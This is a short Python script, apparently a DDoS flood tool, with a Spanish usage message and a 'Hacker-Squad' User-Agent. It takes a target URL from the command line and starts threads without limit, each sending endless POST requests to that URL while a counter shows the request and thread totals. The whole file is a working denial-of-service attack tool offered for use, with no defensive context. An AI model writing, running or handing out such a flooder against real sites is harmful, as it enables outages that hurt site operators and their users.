import aiohttp
import asyncio
import threading
import subprocess
import sys
import time

ths = []

headers = {
  "User-Agent": "Hacker-Squad/6.6.6"
}

start = int(time.time())
try:
  url = sys.argv[1]
except:
  print("Debes escribir una url!")
  
num = 0
reqs = []
loop = asyncio.new_event_loop()

async def fetch(session, url):
  try:
    while True:
      async with session.post(url, headers=headers) as response:
        if response:
          end = int(time.time())
          final = start - end
          finnal = str(final).replace("-", "")
          reqs.append(response.status)
          sys.stdout.write(f"Requests : {str(len(reqs))} | Threads : {str(len(ths))} | Time : {finnal}\r")
        else:
          print("No response, exiting...")
  except:
    pass



urls = []
urls.append(url)

async def main():
  tasks = []
  async with aiohttp.ClientSession() as session:
    for url in urls:
      tasks.append(fetch(session, url))
    ddos = await asyncio.gather(*tasks)

def run():
  try:
    loop.run_forever(asyncio.run(main()))
  except:
    pass


if __name__ == '__main__':
  active = []
  ths = []
  while True:
    try:
      while True:
        th = threading.Thread(target=run)
        try:
          th.start()
          ths.append(th)
          sys.stdout.flush()
        except:
          pass
    except:
      pass
